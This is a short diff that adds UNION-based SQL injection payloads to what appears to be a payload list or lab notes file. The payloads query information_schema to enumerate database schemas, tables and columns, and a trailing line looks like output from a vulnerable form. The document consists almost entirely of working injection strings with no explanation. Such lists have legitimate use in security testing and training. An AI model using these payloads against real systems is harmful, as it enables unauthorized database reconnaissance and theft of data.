@@ -1,6 +1,7 @@
 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
 
-
+1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
+1 AND 1=2 UNION SELECT table_schema, column_name FROM information_schema.columns
 
 
 First name: db_default
